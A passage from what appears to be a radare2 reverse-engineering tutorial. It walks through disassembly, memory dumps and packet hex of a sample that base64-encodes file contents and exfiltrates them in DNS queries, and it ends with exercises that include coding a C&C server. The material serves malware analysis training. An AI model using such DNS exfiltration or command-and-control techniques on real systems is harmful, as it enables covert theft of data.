|     :||   0x00401ecc      4829c4         sub rsp, rax
|     :||   0x00401ecf      488d442440     lea rax, [arg_40h]          ; 0x40 ; '@' ; 64
|     :||   0x00401ed4      4883c000       add rax, 0
|     :||   0x00401ed8      488985c00101.  mov qword [arg_101c0h], rax ; [0x101c0:8]=0
|     :||   0x00401edf      8b45cc         mov eax, dword [local_34h]
|     :||   0x00401ee2      89c2           mov edx, eax
|     :||   0x00401ee4      488b85c00101.  mov rax, qword [arg_101c0h] ; [0x101c0:8]=0
|     :||   0x00401eeb      8810           mov byte [rax], dl
|     :||   0x00401eed      8b45cc         mov eax, dword [local_34h]
|     :||   0x00401ef0      83c001         add eax, 1
|     :||   0x00401ef3      4863c8         movsxd rcx, eax
|     :||   0x00401ef6      488b85c00101.  mov rax, qword [arg_101c0h] ; [0x101c0:8]=0
|     :||   0x00401efd      4883c001       add rax, 1
|     :||   0x00401f01      488b95d00101.  mov rdx, qword [arg_101d0h] ; [0x101d0:8]=0
|     :||   0x00401f08      4989c8         mov r8, rcx
|     :||   0x00401f0b      4889c1         mov rcx, rax
|     :||   0x00401f0e      e8b5160000     call sym.strncpy            ; char *strncpy(char *dest, const char *src, size_t  n)
|     :||   0x00401f13      488d45f0       lea rax, [local_10h]
|     :||   0x00401f17      4883c00c       add rax, 0xc
|     :||   0x00401f1b      488985b80101.  mov qword [arg_101b8h], rax ; [0x101b8:8]=0
|     :||   0x00401f22      8b45cc         mov eax, dword [local_34h]
|     :||   0x00401f25      83c001         add eax, 1
|     :||   0x00401f28      4863c8         movsxd rcx, eax
|     :||   0x00401f2b      488b95c00101.  mov rdx, qword [arg_101c0h] ; [0x101c0:8]=0
|     :||   0x00401f32      488b85b80101.  mov rax, qword [arg_101b8h] ; [0x101b8:8]=0
|     :||   0x00401f39      4989c8         mov r8, rcx
|     :||   0x00401f3c      4889c1         mov rcx, rax
|     :||   0x00401f3f      e884160000     call sym.strncpy            ; char *strncpy(char *dest, const char *src, size_t  n)
|     :||   0x00401f44      488b85b80101.  mov rax, qword [arg_101b8h] ; [0x101b8:8]=0
|     :||   0x00401f4b      4889c1         mov rcx, rax
|     :||   0x00401f4e      e885160000     call sym.strlen             ; size_t strlen(const char *s)
|     :||   0x00401f53      488d500d       lea rdx, [rax + 0xd]        ; 13
|     :||   0x00401f57      488d45f0       lea rax, [local_10h]
|     :||   0x00401f5b      4801d0         add rax, rdx                ; '('
|     :||   0x00401f5e      488985f00101.  mov qword [arg_101f0h], rax ; [0x101f0:8]=0
|     :||   0x00401f65      b910000000     mov ecx, 0x10               ; 16
|     :||   0x00401f6a      488b05b77400.  mov rax, qword sym.imp.WS2_32.dll_htons ; [0x409428:8]=0x97d6 reloc.WS2_32.dll_htons
|     :||   0x00401f71      ffd0           call rax
|     :||   0x00401f73      89c2           mov edx, eax
|     :||   0x00401f75      488b85f00101.  mov rax, qword [arg_101f0h] ; [0x101f0:8]=0
|     :||   0x00401f7c      668910         mov word [rax], dx
|     :||   0x00401f7f      b901000000     mov ecx, 1
|     :||   0x00401f84      488b059d7400.  mov rax, qword sym.imp.WS2_32.dll_htons ; [0x409428:8]=0x97d6 reloc.WS2_32.dll_htons
|     :||   0x00401f8b      ffd0           call rax
|     :||   0x00401f8d      89c2           mov edx, eax
|     :||   0x00401f8f      488b85f00101.  mov rax, qword [arg_101f0h] ; [0x101f0:8]=0
|     :||   0x00401f96      66895002       mov word [rax + 2], dx
|     :||   0x00401f9a      488b85b80101.  mov rax, qword [arg_101b8h] ; [0x101b8:8]=0
|     :||   0x00401fa1      4889c1         mov rcx, rax
|     :||   0x00401fa4      e82f160000     call sym.strlen             ; size_t strlen(const char *s)
|     :||   0x00401fa9      83c011         add eax, 0x11
|     :||   0x00401fac      4189c0         mov r8d, eax
|     :||   0x00401faf      488d45f0       lea rax, [local_10h]
|     :||   0x00401fb3      488b8df80101.  mov rcx, qword [arg_101f8h] ; [0x101f8:8]=0
|     :||   0x00401fba      8b950c020100   mov edx, dword [arg_1020ch] ; [0x1020c:4]=0
|     :||   0x00401fc0      89542428       mov dword [local_28h_2], edx
|     :||   0x00401fc4      488d95100001.  lea rdx, [arg_10010h]       ; 0x10010
|     :||   0x00401fcb      4889542420     mov qword [local_20h_2], rdx
|     :||   0x00401fd0      41b900000000   mov r9d, 0
|     :||   0x00401fd6      4889c2         mov rdx, rax
|     :||   0x00401fd9      488b05587400.  mov rax, qword sym.imp.WS2_32.dll_sendto ; [0x409438:8]=0x97ea reloc.WS2_32.dll_sendto
|     :||   0x00401fe0      ffd0           call rax
|     :||   0x00401fe2      83f8ff         cmp eax, 0xffffffffffffffff
|    ,====< 0x00401fe5      7521           jne 0x402008
|    |:||   0x00401fe7      488b052a7400.  mov rax, qword sym.imp.WS2_32.dll_WSAGetLastError ; [0x409418:8]=0x97b6 reloc.WS2_32.dll_WSAGetLastError
|    |:||   0x00401fee      ffd0           call rax
|    |:||   0x00401ff0      89c2           mov edx, eax
|    |:||   0x00401ff2      488d0daf3000.  lea rcx, str.sendto___failed_with_error_code_:__d ; 0x4050a8 ; "sendto() failed with error code : %d "
|    |:||   0x00401ff9      e8ea150000     call sym.printf             ; int printf(const char *format)
|    |:||   0x00401ffe      b901000000     mov ecx, 1
|    |:||   0x00402003      e818160000     call sym.exit
|    |:||   ; CODE XREF from 0x00401fe5 (sym.sendFile)
|    `----> 0x00402008      0fbf850a0201.  movsx eax, word [arg_1020ah] ; [0x1020a:2]=0
|     :||   0x0040200f      89c2           mov edx, eax
|     :||   0x00402011      488d0db63000.  lea rcx, str.d_bytes_now_sent ; 0x4050ce ; "%d bytes now sent\n"
|     :||   0x00402018      e8cb150000     call sym.printf             ; int printf(const char *format)
|     :||   0x0040201d      b901000000     mov ecx, 1
|     :||   0x00402022      e879150000     call sym.sleep              ; int sleep(int s)
|     :||   0x00402027      8b45ec         mov eax, dword [local_14h]
|     :||   0x0040202a      89c2           mov edx, eax
|     :||   0x0040202c      0fb7850a0201.  movzx eax, word [arg_1020ah] ; [0x1020a:2]=0
|     :||   0x00402033      01d0           add eax, edx
|     :||   0x00402035      6689850a0201.  mov word [arg_1020ah], ax   ; [0x1020a:2]=0
|     :||   0x0040203c      4889fc         mov rsp, rdi
|     :||   ; CODE XREF from 0x00401e33 (sym.sendFile)
|     :|`-> 0x0040203f      0fbf850a0201.  movsx eax, word [arg_1020ah] ; [0x1020a:2]=0
|     :|    0x00402046      3985dc010100   cmp dword [arg_101dch], eax ; [0x13:4]=-1 ; 19
|     `===< 0x0040204c      0f8fe6fdffff   jg 0x401e38
|      |    ; CODE XREF from 0x00401beb (sym.sendFile)
|      `--> 0x00402052      488da5180201.  lea rsp, [arg_10218h]       ; 0x10218
|           0x00402059      5b             pop rbx
|           0x0040205a      5e             pop rsi
|           0x0040205b      5f             pop rdi
|           0x0040205c      415c           pop r12
|           0x0040205e      415d           pop r13
|           0x00402060      5d             pop rbp
\           0x00402061      c3             ret
[0x00401b80]>                                                         
```
This time we'll focus on the read call, the base64 encode and on the sendto only cause we already know about the code and it looks very simple on the big picture.

```
|     :||   0x00401e63      4889c2         mov rdx, rax
|     :||   0x00401e66      488b05537400.  mov rax, qword sym.imp.KERNEL32.dll_ReadFile ; [0x4092c0:8]=0x9576 reloc.KERNEL32.dll_ReadFile ; "v\x95"
|     :||   0x00401e6d      ffd0           call rax
|     :||   0x00401e6f      8b55ec         mov edx, dword [local_14h]
|     :||   0x00401e72      488d4dcc       lea rcx, [local_34h]
|     :||   0x00401e76      488d45d0       lea rax, [local_30h]
|     :||   0x00401e7a      4989c8         mov r8, rcx
|     :||   0x00401e7d b    4889c1         mov rcx, rax
|     :||   0x00401e80      e8cbf6ffff     call sym.base64_encode
|     :||   0x00401e85 b    4898           cdqe
|     :||   0x00401e87      488985d00101.  mov qword [arg_101d0h], rax ; [0x101d0:8]=0
```
Then the encoding will be done, and the buffer will be moved to another one for the sendto()
```
[0x00401e7d]> pxw @ 0x0060fb70
0x0060fb70  0x65726f4c 0x7069206d 0x206d7573 0x6f6c6f64  Lorem ipsum dolo
0x0060fb80  0x69732072 0x6d612074 0x00000000 0x00000018  r sit am........
0x0060fb90  0x00017c09 0x00000100 0x00000000 0x00000000  .|..............
0x0060fba0  0x00000000 0x00000000 0x00000000 0x00000000  ................
```
Here we can see the base64 encoding on memory:
```
[0x00401fe0]> pxw @ 0x0060fb30
0x0060fb30  0x39475421 0x30575a79 0x42586167 0x3057647a  !TG9yZW0gaXBzdW0
0x0060fb40  0x39475a67 0x49336273 0x6c326367 0x46474930  gZG9sb3Igc2l0IGF
0x0060fb50  0x00000a74 0x00000000 0x00000000 0x00000000  t...............
0x0060fb60  0x00000000 0x00000000 0x00000000 0x00000021  ............!...
0x0060fb70  0x00000000 0x7069206d 0x206d7573 0x6f6c6f64  ....m ipsum dolo
0x0060fb80  0x69732072 0x6d612074 0x00000000 0x00000018  r sit am........
0x0060fb90  0x0001fc1f 0x00000100 0x00000000 0x39475421  ............!TG9
0x0060fba0  0x30575a79 0x42586167 0x3057647a 0x39475a67  yZW0gaXBzdW0gZG9
0x0060fbb0  0x49336273 0x6c326367 0x46474930 0x00000a74  sb3Igc2l0IGFt...
0x0060fbc0  0x00010010 0x00000000 0x00000000 0x00000000  ................
```
DNS queries will be looking like this over the network:
```
00000000  1f fc 01 00 00 01 00 00  00 00 00 00 21 64 43 42   ........ ....!dCB
00000010  6b 62 32 78 76 63 6d 55  67 62 57 46 6e 62 6d 45   kb2xvcmU gbWFnbmE
00000020  67 59 57 78 70 63 58 56  68 4c 69 42 56 0a 00 00   gYWxpcXV hLiBV...
00000030  10 00 01                                           ...
    00000000  1f fc 81 82 00 01 00 00  00 00 00 00 21 64 43 42   ........ ....!dCB
    00000010  6b 62 32 78 76 63 6d 55  67 62 57 46 6e 62 6d 45   kb2xvcmU gbWFnbmE
    00000020  67 59 57 78 70 63 58 56  68 4c 69 42 56 0a 00 00   gYWxpcXV hLiBV...
    00000030  10 00 01                                           ...
```

Aaaaaaand we are doneee

Now it's your turn to play with this one here are the recommended exercises for you:

- Make a simple script with r2pipe that keeps track of CandC commands and also for retrieving files and reconstructing them for the b64 program
- Modify / analyze the C&C program to figure out about that mysterious func 
- Code a simple C&C server for those 
